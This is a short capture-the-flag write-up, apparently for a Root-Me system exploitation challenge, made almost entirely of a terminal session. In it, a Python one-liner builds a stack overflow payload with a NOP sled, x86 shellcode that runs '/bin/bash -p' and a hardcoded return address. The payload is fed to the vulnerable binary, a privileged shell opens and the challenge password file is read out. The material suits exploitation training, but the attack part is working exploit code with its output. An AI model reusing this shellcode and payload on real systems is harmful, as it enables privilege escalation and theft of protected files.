
Get a shell but a permission denied while trying to read .passwd

```
app-systeme-ch11@challenge02:~$ python -c 'print("\xff\xff\xff\x80" + "/\x90\x90\x90" + "\x90\x90\x90\x90" * 8 +  "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x90\x90\x90\x90" * 21 + "\xd0\xf9\xff\xbf" * 3)' > /tmp/c11/test
app-systeme-ch11@challenge02:~$ ./ch11 /tmp/c11/test
[+] The pathname is : /�����������������������������������j
                                                           X�Rfh-p��Rjhh/bash/bin��RQS��̀������������������������������������������������������������������������������������������������

bash-4.4$ cat .passwd
8&1-|(5g8q!=
```

----------------------------------------------------------------------------------------
### Resources

[push and pop can messes with EBP and the shellcode](https://security.stackexchange.com/questions/181652/shellcode-doesnt-execute-and-eip-is-overwritten)